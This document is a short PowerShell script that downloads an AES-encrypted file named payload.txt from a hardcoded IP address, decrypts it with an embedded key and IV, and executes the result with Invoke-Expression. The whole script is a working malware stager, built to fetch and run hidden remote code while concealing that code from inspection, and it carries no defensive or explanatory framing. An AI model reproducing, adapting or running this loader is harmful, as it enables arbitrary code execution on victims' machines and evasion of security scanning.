function HexStringToByteArray($hexString) {
    $bytes = New-Object Byte[] ($hexString.Length / 2)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = [Convert]::ToByte($hexString.Substring($i * 2, 2), 16)
    }
    return $bytes
}

# Define Key and IV Hex strings
$KeyHex = 'a2d8c9645e41ec8d9b626da7cf2f0cd0461e9232269478d61597939881f42c8f'
$IVHex = '30795329fdab0438df124dad484119c2'

# Convert Hex to Byte Array for Key and IV
$Key = HexStringToByteArray $KeyHex
$IV = HexStringToByteArray $IVHex

# Initialize AES Managed Class
$AesManaged = New-Object System.Security.Cryptography.AesManaged
$AesManaged.Key = $Key
$AesManaged.IV = $IV

# URL to the encrypted data
$encryptedDataUrl = "http://185.196.8.73:8000/payload.txt"

# Download the encrypted data directly from the server
$EncryptedBase64 = Invoke-RestMethod -Uri $encryptedDataUrl

# Convert from Base64 to byte array
$EncryptedData = [Convert]::FromBase64String($EncryptedBase64)

# Create decryptor and perform decryption
$Decryptor = $AesManaged.CreateDecryptor($AesManaged.Key, $AesManaged.IV)
$DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedData, 0, $EncryptedData.Length)
$DecryptedScript = [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)

# Execute the decrypted script
Invoke-Expression $DecryptedScript
